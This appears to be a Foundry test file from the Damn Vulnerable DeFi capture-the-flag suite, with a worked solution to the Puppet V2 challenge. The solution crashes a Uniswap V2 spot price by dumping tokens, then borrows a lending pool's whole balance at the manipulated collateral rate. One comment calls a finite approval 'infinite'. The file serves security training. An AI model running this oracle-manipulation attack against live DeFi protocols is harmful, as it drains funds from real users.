// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // check how much ETH would be required to borrow lendingPool's total DVT balance
        console.log(
            "starting deposit required: ",
            lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)))
        );
        // check how much WETH the player has
        console.log("player WETH starting balance: ", weth.balanceOf(player));
        // check which token is which since uniswap sorts them by lowest address so it's never a guarantee which is WETH
        console.log("token0: ", uniswapV2Exchange.token0());
        console.log("token1: ", uniswapV2Exchange.token1());
        // check pair state before swap
        (uint256 reserves0Before, uint256 reserves1Before,) = uniswapV2Exchange.getReserves();
        console.log("reserves0Before: ", reserves0Before);
        console.log("reserves1Before: ", reserves1Before);

        // define input amount for swap
        uint256 amountDvtToSwap = token.balanceOf(player);
        // approve uniswap router to swap tokens for weth
        token.approve(address(uniswapV2Router), amountDvtToSwap);
        // build array of token addresses to represent swap path for uniswap router call
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        // deadline swap has to go through by
        uint256 deadline = block.timestamp + 1 hours;
        // swap all DVT tokens for WETH to push price in the direction we want
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountDvtToSwap, 0, path, player, deadline
        );

        // check pair state after swap
        (uint256 reserves0, uint256 reserves1,) = uniswapV2Exchange.getReserves();
        console.log("reserves0: ", reserves0);
        console.log("reserves1: ", reserves1);

        // check how much WETH would be required after changing the price
        uint256 wethDepositRequired = lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)));
        console.log("deposit required after swap: ", wethDepositRequired);
        // check how much WETH the player has
        uint256 playerWethBalance = weth.balanceOf(player);
        console.log("player WETH balance after swap: ", playerWethBalance);
        // calculate how much more WETH we need
        uint256 ethToWrap = wethDepositRequired - playerWethBalance;

        // wrap ETH to get enough WETH
        weth.deposit{value: ethToWrap}();
        // infinite WETH approval to lendingPool for borrow transaction
        weth.approve(address(lendingPool), wethDepositRequired);
        // borrow DVT tokens from lendingPool at reduced rate
        lendingPool.borrow(token.balanceOf(address(lendingPool)));

        // transfer tokens to recovery account
        token.transfer(recovery, token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
